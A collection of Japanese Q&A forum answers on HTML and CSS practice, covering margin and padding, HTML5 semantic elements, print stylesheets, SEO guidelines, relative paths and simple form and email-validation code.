■で書かれている項目はすべて間違った認識です。 ■marginとpaddingは要素にボーダー・背景色を使用しない限り、表示に違いはない。 　ブラウザ(ユーザーエージェント)は、それぞれスタイルシートを持っています。 　⇒A. HTML 4.0におけるスタイルシートの例( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) 　また、指定がない場合のデフォルト値も定められています。 　⇒初期値（Initial）( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) ■marginはIE6などでレイアウトが崩れる場合や、ブラウザによって相殺が起きたり起きなかったりする場合もあるので、余白は全てpaddingで指定する。 margin,padding,width,height,border-widthの相互関係は、仕様書の 　⇒8. ボックスモデル( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) をよんでください。block要素とinline要素で変わります。 　IEの互換モードでは、ボックスモデルの場合border辺の内側が内容サイズになりますが、他のブラウザは仕様書どおりpadding辺の内側です。 　そのため、doctypeスイッチ - Google 検索( https://www.google.co.jp/search?q=DOCTYPE%E3%82% … )でブラウザが標準モードで動作するようにすれば、ブラウザ間の誤差はある程度解消できます。 　また、paddingが問題になるのですから、paddingを極力使用しないほうが良いです。 ■ページ全体の設定はデフォルトで margin:0px と padding:0px とし、余白のいらない要素には何も記述しない。(CSSをスッキリさせたいので) 　これも典型的な誤りです。 　使われるスタイルシートはCSS(カスケーディングスタイルシート)だと思いますが、CSSの最大の利点はカスケーディングです。すなわち、出所、優先順位、詳細度などをあわせた仕組みです。--これを理解しないでmargin,paddingというプロパティに手をつけるのはダメですよ。 　ブラウザがデフォルトで持つスタイルシート 　⇒A. HTML 4.0におけるスタイルシートの例( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) 　は優先度--詳細度0--ですが、それをすべて0にしてしまうとブラウザが持つスタイルシートをすべて書き加えなければなりません。 　これこそスタイルシートを煩雑にする最大の理由なのです。 「表示に違いがないのであれば、出来れば余白は全てpaddingに統一したいのです。」 　必ずmarginを使用しましょう。また必要なとき必要に応じて指定しましょう。 ■ページ全体のセンタリングは、 margin:0px auto とする。(どのサイズのスクリーンで見ても、真ん中にくるようにしたいので) 　⇒左側に設置したバナーの縦の長さを小さくしたいです - HTML - 教えて！goo( http://oshiete.goo.ne.jp/qa/7953410.html ) のNo.1で回答した内容を見て画像を用意して 　⇒左側のバナーの背景色を、任意の色に変更したいです。 - HTML - 教えて！goo( http://oshiete.goo.ne.jp/qa/7953557.html ) 　のNo.2のスタイルシートを適用してみてください。 　スマホでも幅広ディスプレイでも中央に表示されるはずですが、HTMLのスタイルシート指定で <style type="text/css" media="screen"> としておくと、印刷には適用されません。
サイトのレイアウトなどに特にこだわりがなければ、ブログくらいならHTMLの知識はあまりなくても大丈夫だと思います。 下記の様なサイトからCSSのテンプレートをダウンロードして使用すれば作れますよ。 http://www.coolwebwindow.com/
いえ、スタイルシートが印刷用が用意してあれば、単純にファイル→印刷ですよ。 ＞表示用ページにあるprintボタンを押しと自動的に印刷用ページの印刷プレビュー画面を表示したいのですが、 　これはアプローチが違います。 [例] ナビゲーションリストを様々にデザインしてみよう。( http://www.ichiya.com/WebService/Howto/sample/HT … ) 　では、メニューバーの[表示]→[スタイルシート]でスタイルをscreem用スタイルを様々に指定できますが、印刷はどのスタイルを選んでも印刷用スタイルシートで印刷されます。 ペットボトル握力計( http://iruka.la.coocan.jp/craft/HandDynamometer/ … ) もそうなっていますね。 「HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 　わざわざ、HTMLで文書構造をプレゼンテーションをスタイルシートに分けるのは、「広汎なプラットフォームや多様なメディアでの文書提供コストを低下でき、文書の改訂も容易になるということが、経験的に知られている。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」とあるように、印刷用と表示用、携帯端末用、スマホ用と同じ内容の複数のページを作らなくてすむようにするためですよ。
音量等の細かい制御はjQueryでしているようですが、 根っことなる技術はHTML5です。 HTML5でvideoタグとaudioタグが追加され、 　<video src="video.mpg"></video> 　<audio src="audio.mp3"></audio> と書くだけで、Flashを使わなくても動画や音を再生できるようになりました。
はじめまして。 仕事でHP作ったりしてますが、うちでは IE以外は最新を使ってやってます。 IEは最近だと７～10でチェックしてる感じですね。 IEは特にバージョンによってCSSやJavascriptなんかに違いが出てくるんで 必ず最新版以外も試してます。 IEは未だに古いのを使ってる方も少なくないのでどうしても復数のバージョンが チェック対象になってるのが実情ですね（うちの場合）
昨日の回答の追加 参考URLのようにすればいいのでは？・・・ ＨＴＭＬは、HTML5で記述、ＣＳＳは、３．０、レイアウトには、SkeltonＦｒｅｍｅｗorkを使用しています。 あとは画像と、ＣＳＳを、変更すれば、思い通りの画像、デザインに変更できると思います。 なおリンクは、省略していますので、ファイル場ないという表示がされます。 ダウンロードは、http://www.nanden.asia/test/test.zip から行えるように設定しておきました。 参考になれば幸いです。 参考URL：http://www.nanden.asia/test/temp.html
#menu li a { display:block; width:220px; color:#f1f1f1; /*line-height:60px;*/ padding: 4px 0; } line-height: の値を小さくすればいいんですけど、padding の方がおすすめで、4px の値を調整してください。 これで、リンク同士の幅が小さくなり、サイドメニュー全体が短くなります。
いずれも正確には正しくありません。 　HTML5では、インタラクティブな要素や属性--<video><canvas>--と共に、いやそれ以上にセマンティックなHTMLを目指しています。それはWebを巨大なデータベースと考えるとき、そのHTML文書の中で、どれがヘッダで、どれが本文で、どれがフッタで、どれが本文と関係ない記事かを検索エンジンを含め、わかるようにマークアップするということです。 　DIVに関しても、 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから Authors are strongly encouraged to view the div element as an element of last resort, for when no other element is suitable. Use of more appropriate elements instead of the div element leads to better accessibility for readers and easier maintainability for authors. ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［4.5 Grouping content — HTML5( http://www.w3.org/TR/2012/CR-html5-20121217/grou … )］より 　すなわち『著者は、他に適切な要素がないときの最後の手段の手段としてdiv要素を使用することが、強く奨励される。div要素より適切な要素を使用することで、読者のアクセシビリティと、著者の保守が容易になることが知られている』 　これはDIVは、「原則使用しない、本当により適切な要素がないか見直せ!!」ということですね。 　ですので、 <body> 　<header> 　　文書のヘッダ 　</header> 　<section><!-- 　　<h2>本文見出し</h2> 　　<section> 　　　<h3>項目見出し</h3> 　　　・・記事・・ 　　</section> 　　<section> 　　　<h3>項目見出し</h3> 　　　・・記事・・ 　　</section> 　　<nav id="contentsTable"> 　　　・・・目次・・ 　　</div> 　　<aside> 　　　本文とは関係ない記事 　　</aside> 　</section> 　<footer> 　　フッタ 　</footer> </body> となるべきでしょう。 　section要素は、セクショニング・コンテンツのひとつで、これは文書のアウトラインを構成しうるときにのみ称されます。目次を自動生成すると考えると良いでしょう。 　sectionの階層によって section 編 　section 章 　　section 節 　　　section 項 となるような場合ということです。 　本文と関係ないものは、<aside>---目次を作らない--や<figure>--他から参照される注釈・挿絵的なもの、<article>--自身にheader,section,footerを持ちうる完結した記事、他の記事の要約とか--を使用します。 　wrapperとして必要なのでしたら、それが記事全体を囲むものでしたら <body> 　<article> 　　<header></header> 　　<section></section> 　　<footer></footer> 　</article> </body> でしょうし、本文中にブログ記事などを持ってくるなら ・・・前略・・・・ 　　　<section> 　　　　<h3>見出し</h3> 　　　　・・・記事・・ 　　　　<article> 　　　　　<header>ヘッダ</header> 　　　　　<section></section> 　　　　　<footer></footer> 　　　　</article> 　　　</section> ・・・・後略・・・・ でしょう。 ＞</header> ＞<div class="wrapper"> ＞<div>の3カラム ＞</div> ＞</footer> は、色々な意味で、おかしいです。上記のDIVの使用法に加えて 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから The div element has no special meaning at all. It represents its children. It can be used with the class, lang, and title attributes to mark up semantics common to a group of consecutive elements. ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［4.5 Grouping content — HTML5( http://www.w3.org/TR/2012/CR-html5-20121217/grou … )］より 『div要素は、まったく特別な意味を持ちません。これを用いてこれは、連続した要素をグループ化することで共通のセマンティクスをマークアップします。lang、属性とtitle属性(およびグローバル属性)を使用することができます。』--wrapperはセマンティクではありません。この場合は<section>を使用すべきです。 (参考) 　実はDIVの使い方はHTML4.01でも『id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』となっていました。それで考えてもwrapperというclass名はおかしい。 ・HTML5の『新しい要素( http://standards.mitsue.co.jp/resources/w3c/TR/h … )』 　⇒HTML5( http://www.w3.org/TR/html5/ ) 　よく見かけるからと言って正しいわけじゃありません。wrapperとか、leftMenueとか腐るほど見かけますが(^^) 　上記で上げたサンプル、誰が見てもどこがheaderでどこが本文で、それが何階層かも一目瞭然でしょう。一番楽になるのは自分自身です。 　ちなみに、3カラムで表示させるスタイルシートを書くと body>header,body>section,body>footer{margin:0 auto;max-width:800px;} section{position:relative;min-height:300px;} section section{margin:0 200px;min-height:0;} section nav,section aside{width:200px;position:absolute;top:0;font-size:0.9em;} section nav{left:0;} section aside{right:0;}
FireMobilesimulator では「@import url("smartphone.css") screen and (max-width:480px);」を指定しても対応できません。 ブラウザの幅を設定している訳では無く、受け取ったHTMLを表示する際に表示の幅を制限して表示しているだけなので、ブラウザ本体が認識している幅はウィンドウの幅です。 プラグインが関与できる機能範囲の問題ですので、たぶん他のシミュレーターでも同じだと思います。
No.1です。 ＞CSSでボタンデザインを変えることで実現させるのですね。 それだけではありません。 http：//hpcgi1.nifty.com/Iruka/ENV_FORM.cgi/lolololol/data.html?AAA=BBB でも、二種類で渡しています。 /lolololol/data.html がPATH_INFOです。 ?以降のAAA=BBBがQUERY_STRINGです。
＞上記によると日付は1つ以下とあります。ただ、私の1つのページには更新のため、 ＞2つ以上日付を書く可能性があります。 ＞ですので<time>を使わず、日付を文章の様に扱う事はできないでしょうか？ 正確に読みましょう。 ＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿ここから 　pubdate属性を指定すると、 　^^^^^^^^^^^^^^^^^^^^^^^ 　⇒<time>で示した日時が 　　・親要素の<article>の公開日時であることを表します。 　　　　　　~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 　　・親要素の<article>が存在しない場合には、 　　　^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^　 　　　　文書全体の公開日時を表しますが、この場合には、文書中の<time>は1つ以下でなければなりません。 ￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで ★しかしながら、このpubdate属性は、とうの昔に議論され( http://www.w3.org/wiki/User:Tantekelik/drop_pubd … )、最終的に削除( http://www.w3.org/html/wg/tracker/issues/185 )されましたから、使えません。 　必ず仕様書を確認してください。 　⇒4.6.10 The time element( http://www.w3.org/TR/2012/CR-html5-20121217/text … ) 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから Content attributes(含めうる属性): 　　　　　　Global attributes(グローバル属性) 　　　　　　datetime ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［4.6 Text-level semantics ― HTML5( http://www.w3.org/TR/2012/CR-html5-20121217/text … )］より 　time要素には、グローバル属性とdatetimeしかありません。 　^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ また、 　⇒The W3C Markup Validation Service( http://validator.w3.org/#validate_by_input ) で、チェックしてもエラーが出るはずです.(もちろんalign属性もエラーとなったはずです。) 　私がNo.1で示した回答は、それらを踏まえて書きました。 <article>や<section>の親要素があります!! ＞ですので<time>を使わず、日付を文章の様に扱う事はできないでしょうか？ 　質問を残したまま締め切らないでくださいね。
nameの代わりにid="CCC"とすると動いたりしませんか？
まさかとは思うけど、もしかして、「.htaccess」ファイルに何も記述していないとか？ 下記サイトが参考になるはずです。 参考URL：http://www.webcreator-net.com/tips_memo/css/2012 …
<BGSOUND>タグで記述しましたね？ http://www.htmq.com/html/bgsound.shtml 上記の情報のとおり、<BGSOUND>は Internet Explorer のみの機能です。 <EMBED>タグの方がよいかも。
過去互換では重複指定はできないです。標準準拠の文書宣言をしてみてもダメですか？ 例 <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
LocationMatch で指定のURLに引っ掛かるようにして認証をかけたらできると思います。 http://httpd.apache.org/docs/2.0/ja/mod/core.htm …
　私は何もしていませんが、検索結果の順位が下に来ることもないし、それで悩んだことはありません。 　ホッタラカシにしていても、多くのサイトからリンクされてくるし・・・ ひたすら。。。。 ウェブマスター向けガイドライン( http://support.google.com/webmasters/bin/answer. … ) 　に忠実にというか、端からそうしています。 ひとつ　世界中でそのテーマに関しては秀逸であるような内容にすること ふたつ　検索エンジンのためではなく利用者のために最善であるように心がける。 みっつ　検索エンジンに内容が理解できるよう文書構造を正しくマークアップする。 よっつ　手地にも含めてウェブ標準であること 　検索エンジンの上位を目指す一切の小手先の技は逆効果であると肝に銘じています。これは「検索エンジンはユーザーのためにある」のであって「著者のためにあるのではない」という原則を考えれば容易に想像できることです。そのような技が登場するたびにgoogleはパンダアップデート--白黒をつけるアップデートを行っていますからね。 　いわゆる、まっとうなSEO業者は、まずこの点をアドバイスします。 　⇒品質に関するガイドライン( http://support.google.com/webmasters/bin/answer. … ) 　大多数の自称SEO業者は、そうではありません。詐欺師の集団と考えています。 ＞しかし、それだけでは当然検索エンジンで上位に持ってくることは難しいですよね。 　「それ」の内容が分かりませんが、すくなくとも私の多くのサイトに関しては、『自分のウェブサイトが独自性、価値、または魅力のあるサイトといえるようになるかを考え、同分野の他のサイトとの差別化を図』ることで、確実にトップ、悪くても最初のページに現れます。 　SEOとは検索エンジン最適化(Search Engine Optimization)・・・文字通り＝検索エンジンがそのページの内容を正確に把握できるようにマークアップすること・・・なのですよ。
一切関係ありません。 なぜなら、HTTP要求ヘッダを確認されると分かるように 　firefox + Live HTTP Headers( https://addons.mozilla.jp/firefox/details/3829 ) サーバーに要求するときは、あくまでブラウザが判断したURLだからです。 [例]ブラウザがカレント(今いる場所)を /hoge.com/abc/efg/hijと判断しているとき 　href="http：//hoge.com/abc/efg/bbb" 　href="/abc/efg"/bbb 　href="../abc/efg/bbb" 　href="../efg/bbb" 　href="./bbb" 　href="bbb" / |-- abc/ 　　　|-- efg/ <-- カレント 　　　　　　|-- bbb 　　　　　　|-- hij のいずれも、サーバーに対して GET /abc/efg/bbb と要求するからです。 　 ＞1万位リンクがあれば多少変わってくるかと思うのですが、 　変わりません。ブラウザが判断するのは一瞬ですから・・。表示されている時点で計算は終了しています。 　ぜひ、上記アドオンでその仕組みを確認してください。
メールアドレスが実在するかしないかは兎も角、メールアドレスとして正統な物か否かは、正規表現でチェックできます。 受信するCGI側で、モジュールEmail::Valid( http://search.cpan.org/search?dist=Email-Valid ) )または、モジュールMail::CheckUser( http://search.cpan.org/search?dist=Mail-CheckUser )を使うのが一般的だと思いますが、 　⇒メールアドレスの正規表現( http://www.din.or.jp/~ohzaki/mail_regex.htm ) のようなスクリプトを使うこともできます。 　また、ごく簡単に済ますなら・・・単純に $mail_pattern = '(^[\w\.\-]+\@[\w\.\-]+\.[a-zA-Z]{2,4}$|^$)'; 　とかで調べて済ます方法もあります。 詳しくは 　⇒Perlメモ( http://www.din.or.jp/~ohzaki/perl.htm#Mail ) など・・
単に受注したいだけでしたら、メールフォームCGIを利用されるとよいかと。 フォーム内容をメール送信するプログラムで、簡単なショッピングサイトの注文の他、ご意見、お問い合わせFORM等でよく使用されます。 多くのレンタルサーバでは標準・無料で設置されていますから、ご利用サーバのマニュアルを探してみてください。 あるいは無料でもたくさん配布されているのでそちらでもよいでしよう。(CGI設置可能なサーバであればですが)　 「無料 メールフォーム CGI」 あたりで検索してみてください。設置方法も記載されているばずですから臆することはありません。挑戦してみてください。 蛇足ながら仕組みとしては、formの送信先を <form action='指定のプログラム' ～ とすれば そのプログラムが、FORMの内容を設定したメールアドレスに送る、というものです。 ※確認画面やありがとうございましたページは、たいていの場合そのCGI側で設定できます。
div要素は、HTML４．０１以降は使わないようにするように推奨されています。しかしながら、Lyoutなどの場合にどうしても使いたくなることが多いようです。HTML5では、artcle, section,nav,futtor,heder,というような文章構造をよりわかりやすくする要素が追加されました。 一派的には、文章の塊と覚えていた方がいいのではないでしょうか？ <div> 　　<hn>見出し</hn> <p> 文章 　　　　</p> <blockquote> <p> 引用文 　　　　　　</p> </blockquote> </div> というように、ブロック要素の一つとして覚えておくのが、わかりやすいと思います。 詳しくは、W3Cの仕様書をご覧ください。 参考URL：http://www.asahi-net.or.jp/~sd5a-ucd/rec-html401 …
webkitを利用すればＣＳＳ3で対応できるとおもいますが？・・・ ＣＳＳのソースを修正されてはいかがでしょうか？・・・
OBJECTはいくらでも入れ子にできますから、それがいちばん楽です。javascript未対応のブラウザは無論、検索エンジンにも有利です。なんと言っても簡単。 <object> 　<object> 　　<object> 　　　<object> 　　　　代替テキスト 　　　</object> 　　</object> 　</object> </object> 　⇒13.3 一般的包含: OBJECT要素( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) <object data="Flashデータ名" type="application/x-shockwave-flash" style="width:サイズ; height:サイズ;"> 　<param name="movie" value="Flashデータ名"> 　<object data="kanban.jpg" type="img/gif"> 　　代替テキスト 　</object> </object>
スタイルシートへのパスを絶対配置にすればすむだけでは？ 　そのほうが絶対に楽です。 HTTPサーバーは http：//hoge.com/abc/efg という要求に対して、 ・efgというファイルを探し、 ・ファイルがなければディレクトリとみなして、 　　/efgを開いてみて、 　　　その中にDIRECTORY_INDEXで指定されたファイルがあればそれを 　　　DIREXTORY一覧を表示する設定ならそれを ・ファイルもディレクトリない場合はPATH_INFOに/efgを格納して、/abcに対して同様な処理をしていきます。 ・トップディレクトリまで進んで、DIRECTORY_INDEXに指定されたファイルを表示または実行します。 　そのため、ブラウザが判断するカレントは、http：//hoge.com/abc とhttp：//hoge.com/abc/ は異なりませんが、index.phpなどをトップにおいている場合は、判断を間違う可能性がありますが、それはサーバーと言うよりブラウザの判断ですから、スタイルシートを絶対パスで指定するほうが確実です。 　すなわち <link rel="stylesheet" type="text/css" media="screen" href="/styleSheet/standard.css"> のように指定します。 　PATH_INFO・・・をどのように指定しても、 http：//hoge.com/abc/efg だろうが、http：//hoge.com/abc/efg/hijだろうが気にしなくて良いです。 　ちなみに私はテスト用にapacheを入れています。それとfirefoxのアドオンServer Switcher( https://addons.mozilla.jp/firefox/details/2409 )でローカルサーバーとリモートサーバーを切り替えています。 　ローカルサーバーがないと、絶対パスで指定してあるスタイルシートを利用しずらいですね。
楽天RMSと絡んでいなくてもリンク設定の基本は下記のとおりです。 ■文字にリンク付けをする場合。 ※「楽天の洋服」の文字をクリックするとリンク先ページに移動します。 HTMLの記述例 <a href="http://www.rakuten.co.jp/">楽天の洋服</a> 解説 <a></a>　リンクタグ <a href="ここにリンク先のURLを記述">ここにリンク文字を記述</a> ■バナーや商品写真にリンク付けをする場合。 ※下記記述では改行されていますが、HTMLの記述では "< >"で囲まれていない部分に半角スペースがあっても無視されます。 また、改行も無視されます。 HTMLの記述例 <a href="http://www.rakuten.co.jp/"> <img src="http://image.rakuten.co.jp/com/img/skp/0008/chil … </a> 解説 先ほどは「楽天の洋服」にリンクを付けましたが、 「楽天の洋服」の代わりに「バナーや写真」のURLを記述します。 <img src="ここにバナー・画像のURLを記述"/> 画像のURLはR-Cabinetに登録した際の【画像保存先】のURLを入力します。 ■補足 <td>や<tr>のタグはテーブルタグ類で、 「class="skplncatechild"」はCSS(スタイルシート)類の記述になります。 焦る気持ちもありますが、一度に理解しようと無理をせず HTMLを切り分けて、一歩づつ理解していきましょう。 ■参考ページ http://www.htmq.com/
iphoneを持っていないのでなんとも言えませんが、position:absolute;を使ってfixedと同じような状態にする方法はどうでしょうか。 http://www.kuhp.kyoto-u.ac.jp/~diag_rad/web/p_fr …
RequestFullScreenを使ってね
iframeでGoogle Mapを埋め込むのではなく、JavaScriptを使ってGoogle Mapを埋め込めば細かな設定ができるようになります。JavaScriptをまったく触ったことがない場合は、ちょっと難しいかもしれません。No.1さんのリンクが参考になりますね。
いわゆる file:///C:\faile名 と http:// はまったく異なります。 http:// は通信プロトコルを意味していますから、HTMLサーバーが必要です。 サーバーとはハードでありソフトであるのですが、そのパソコンなりネットワーク上の他のコンピューターでHTTPサーバーが動作していれば良いです。 　もちろんインターネットを経由する場合は、IPアドレスと、別途ネットワーク上のDNSサーバーでの関連付けが必要となります。 ・ドメイン名の取得 ・DNSサーバーへの登録 ・HTTPサーバー 　が最低限必要になります。
HTMLが書かれている文字コードとcaharsetの文字コードが違うだけでは？
とっても--少なくとも15年以上前の参考書を見ているようですが・・・ tableは、配置のために使用してはなりません。あくまで表データのみです。 また、xml/xhtmlの仕様とあわせるため、要素名属性名は小文字で書くことが多いですね。 DIR=LTR（文字方向)は、通常は書きません。代わりにlang="ja"が必須です。<html lang="ja"> <table summary="test"><!-- HTML4.01ではsummaryは必須です --> 　<tbody><!-- tbodyも原則必須です --> 　　<tr> 　　　<th abbr="">・・・<!-- thにはabbrが必須 --> ・・とかです。後方互換のためborder="1" のみは書いておくほうが良いでしょう。 <table summary="test" border="1"> 　どのように描画するかはスタイルシートで記述します。 table[summary="test"]{ /* summary属性の値がtestのtable */ border-collapse:collapse; /* 結合ボーダーモデルを指定します */ border:solid 1px red;/* tableの外枠を指定します */ } table[summary="test"] th, table[summary="test"] td{ /* セルの指定です */ border: solid blue gray; } ・・・となります。 　使用されている参考書がとっても古いようです。
＞ソースコードを直接にコピーするのはだめのようですね 　が何を意味するのかが分かりません。 　HTMLのソースを見て、参考になるものはいくらコピーしてもよいですが、内容に関してはダメです。 　そもそも、HTMLは、ティム・バーナーズ＝リー( http://ja.wikipedia.org/wiki/%E3%83%86%E3%82%A3% … )が、誰でもその知識を共有できるようにと考案したWorld Wide Web( http://ja.wikipedia.org/wiki/World_Wide_Web )で使用する言語で、誰でも自由に使用できます。 　それは、文書をそれを構成する要素に分解して、それが文書にとってどのような要素であるかをマークアップするマークアップ言語のひとつで、他の文書へのリンク機能(ハイパー)をもつHyper Text Markup Languageです。 例えば、 <h1>ここは第一レベルの見出し-heading--<h1> <p>ここからはひとつの段落-paragraph-です。</p> 　というふうに・・・、せいぜい数十個しか使わないでしょう。 　このマークアップや、それをどのようにデザインするかのスタイルシートは、まったく自由に利用しても構いませんが・・・・。その内容はダメです。 　すなわち ここは第一レベルの見出し-heading-- ↑これは「第一レベル見出し」要素の内容です。 ここからはひとつの段落-paragraph-です。 ↑これは段落要素の内容です。 ＞HTMLなどの知識は殆ど無いのです。 　こんなもの、誰でもできるようにHTMLは考えられています。あんなに多くの人が使っているもの---身につければよいじゃないですか？ 　そもそも、あなたのデータを読んで、それをマークアップなんて<strong>あなた本人でなければ決してできない</strong>のですよ。 　↑私が重要と判断したので、その部分が重要だとマークアップしました。 　⇒はじめてのWebドキュメントづくり( http://www.asahi-net.or.jp/%7Esd5a-ucd/www/ ) でも一通りやってみて、その後で考えてみてください。 　HTML4.01の仕様書翻訳メンバーの内田さんが、中学生のお子さんのために書かれたと聞いています。 　
wikiを使うのでしたら・・・ 例えば、@niftyをインターネット接続サービスで利用されているなら @niftyホームページサービス - ホームページ作成なら@niftyホームページサービスで！( http://homepage.nifty.com/index.htm )のようなサービスがあります。 　ご利用のISP(インターネットサービスプロバイダー)のサービスを調べてみましょう。 　上記@niftyでしたら 　⇒自分でつくるウィキペディア : @niftyホームページサービス( http://homepage.nifty.com/help/webapps/pukiwiki/ … ) 　⇒自分でつくるウィキペディア : @niftyホームページサービス( http://homepage.nifty.com/help/webapps/mediawiki … ) 　のように二種類のWikiが利用できます。
検索エンジンはframeの内部までは検索しません。あくまでページ単位です。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから Lynx などのテキスト ブラウザを使用して、サイトを確認します（ほとんどの検索エンジンのスパイダーには Lynx で見えるようにサイトが映ります）。JavaScript、Cookie、セッション ID、フレーム、DHTML、Flash などの特殊な機能が使用されているためにサイトの一部がテキスト ブラウザで表示されない場合、検索エンジンのスパイダーがサイトをうまくクロールできない可能性があります。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［ウェブマスター向けガイドライン - ウェブマスター ツール ヘルプ( http://support.google.com/webmasters/bin/answer. … )］より 　iframe/frameに関わらず、frameを使わなくてもサイト内が移動できるようにすることが基本中の基本です。Lynxを用いて移動してみると良いでしょう。 ★Lynxブラウザでの表示を添付しておきますが・・・ダメだとしか・・・ 特に隠しリンクはgoogleから嫌われますし・・ 隠しテキストと隠しリンク - ウェブマスター ツール ヘルプ( http://support.google.com/webmasters/bin/answer. … )
■HTML <form> <fieldset> <legend>FOO</legend> <ol> <li class="inputText"><label for="GOO">テキストフォーム</label><input type="text" value="" id="GOO" /></li> <li class="inputSubmit"><input type="submit" value="検索" /></li> </ol> </fieldset> </form> ■CSS form { overflow:hidden;} form * { margin:0; padding:0; border:0; list-style:none;} form fieldset { float:left;} form ol { position:relative;} form li.inputText input { position:absolute; left:0; width:200px; line-height:normal;} form li.inputSubmit input { display:block; margin-left:200px;} form legend, form label { display:none;} /* ボックスの設定値 */ form fieldset { padding:5px; /* 余白の幅 */ background:#444; /* 余白の色 */} form li input { height:1.2em; /* ボックスの高さ(em) */ font-size:100%; /* フォントサイズ */} form li.inputText input { background:#ddd; /* テキストボックスの背景色 */} form li.inputSubmit input { padding-left:0px; /* 実行ボタンの左右の余白(上下は不可) */ padding-right:0px; background:#ddd; /* 実行ボタンの背景色 */} そこそこの範囲のブラウザに対応できると思います。 XHTMLor標準準拠モード用。 フォームの上下の余白を調整したい場合はinputに直接paddingを指定するのは避け、背景画像等で調整します。
現在は兎も角・・将来どうするかです。 /　　　ルート |-- index.html |-- profile.html |-- product/ |　　　|-- index.html |　　　|-- images/　product以下で使用する画像 |　　　|-- tools/ |　　　|　　　|-- index.html |　　　|　　　|-- images/ ・・・【中略】・・・ |-- images/　　ルート以下で使用する画像 |　　　|-- photos |　　　|-- logo |-- js　　javascript というふうに、サブコンテンツがないものについは、ディレクトリを設けませんが、そうでないものについてはディレクトリに入れて整理することが後々楽です。 　html以外のファイルも入るわけですから、今は兎も角・・将来を見据えて整理したほうが良いでしょう。
マップを埋め込むよりも、APIを利用して表示する方法のほうがご質問のようなことはやりやすいと思います。 「iframe」が必須なのかが不明ですが、iframeでなく直接表示するほうが簡単だと思います。 リンクで移動する部分だけの例ですが… http://oshiete.goo.ne.jp/qa/7908345.html マーカーや吹き出し表示をコントロールする例 http://oshiete.goo.ne.jp/qa/7894323.html 好きなように使い倒すにはこちらを理解する必要が… https://developers.google.com/maps/documentation … サンプルの使用例がこちらに沢山ありますので、どのようなことができるのかを見るには手っ取り早いかも https://developers.google.com/maps/documentation …
No.2へのお礼 ＞DIV使ってる海外テンプレによくありますが、アレはなんなでしょう・・・。 DIV要素の使い方ですが・・ HTML4.01では、「DIV要素とSPAN要素は、id属性及び class属性と併用すること で、文書に構造を付加するための一般機構を提供する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」とされていましたが、この記述が理解できなくて、文書構造を示すために使 われることが少なかったため、『HTML5では、文書をよりよく 構造化するため に、次の要素が新しく追加されました。( http://standards.mitsue.co.jp/resources/w3c/TR/h … )』としてheader,section,footer,article,・・・ 　それに伴い、DIV要素は、 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 　・・・【中略】・・・class, lang, title 属性を使って、連続した要素のグ ループに共通のセマンティクスをマークアップすることができます。 NOTE(注意):ウェブ制作者は、 div 要素を、他に適切な要素がないときなど、最 後の手段の要素として見なすことが、強く推奨されます。div 要素の代わりに もっと適切な要素を使うことは、読者にとってアクセシビリティ向上に、ウェブ 制作者にとってメンテナンス性の向上につながります。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［div 要素 - コンテンツのグループ化 - HTML要素 - HTML5 タグリファレンス - HTML5.JP( http://www.html5.jp/tag/elements/div.html )］より となりました。 ★多く使われているから正しいわけではありません。 折角、HTML5を使われるなら、これらの新しい要素を使うほうがよいのです。た だ、IEについては対応していない旧バージョンが使われ続け ているため、 javascriptでブラウザに知らせないとなりません。 　私は、HTML4.01で製作するときは <body> 　<div class="header"> 　</div> 　<div class="section"> 　</div> のように書いてきました(HTML5の草案以降)が、そのほうがメンテナンスも容易 になるだけでなく、検索エンジンもページの文書構造を正確 に把握できる SEO(検索エンジン最適化)としても有効だったからです。 ★HTML5の仕様については、「HTML5タグリファレンス - HTML5.JP( http://www.html5.jp/tag/index.html )」にありますが膨大なので、 HTML4.01strict( http://www.asahi-net.or.jp/~sd5a-ucd/rec-html401 … )をしっかり 理解したうえで、「HTML5 における HTML4 からの変更点( http://standards.mitsue.co.jp/resources/w3c/TR/h … )」を読ま れておくと良いでしょう。 　確かに「運転免許がなくても車で公道を走ることはできます」し、それは正し いし、実践されている方も多いのですが、私は間違っているかもし れません が、「免許を取得しなければ公道を車で走らないでください。」としか回答でき ないのです。・・ここでは ここまで・・
